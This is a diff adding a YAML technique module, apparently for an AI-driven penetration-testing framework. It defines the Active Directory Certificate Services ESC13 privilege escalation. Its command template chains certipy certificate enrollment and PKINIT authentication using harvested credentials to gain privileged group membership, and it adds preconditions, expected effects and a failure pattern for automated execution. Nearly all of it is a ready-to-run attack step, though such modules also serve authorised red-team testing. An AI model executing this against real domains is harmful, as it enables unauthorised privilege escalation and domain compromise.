@@ -1,0 +1,37 @@
+name: adcs_esc13
+category: ad
+description: ADCS ESC13 — OID group link in issuance policy grants implicit group
+  membership
+preconditions:
+- has_cred
+- service.port==445
+- enroll_right_oid_template
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  ca: from_engagement.ca
+  template: from_engagement.esc13_template
+command_template: certipy req -u {username}@{domain} -p '{password}' -ca '{ca}' -template
+  {template} -dc-ip {target_ip} && certipy auth -pfx {username}.pfx -domain {domain}
+parser: generic_parser
+expected_effects:
+- certificate_obtained
+- privileged_group_membership
+- has_cred
+falsifier:
+  pattern: ACCESS_DENIED|ENROLLMENT_DENIED|template not linked
+  timeout: 60
+model_tier: sonnet
+mechanism: 'Issuance policy OID is linked (msDS-OIDToGroupLink) to a privileged group.
+
+  Any user who can enroll for a cert whose issuance policy contains that OID
+
+  gets the group''s SID in their TGT at PKINIT logon, even without being a member.
+
+  '
+references:
+  ocd_mindmap: 'Branch 7: ADCS ESC13 (OID group link)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
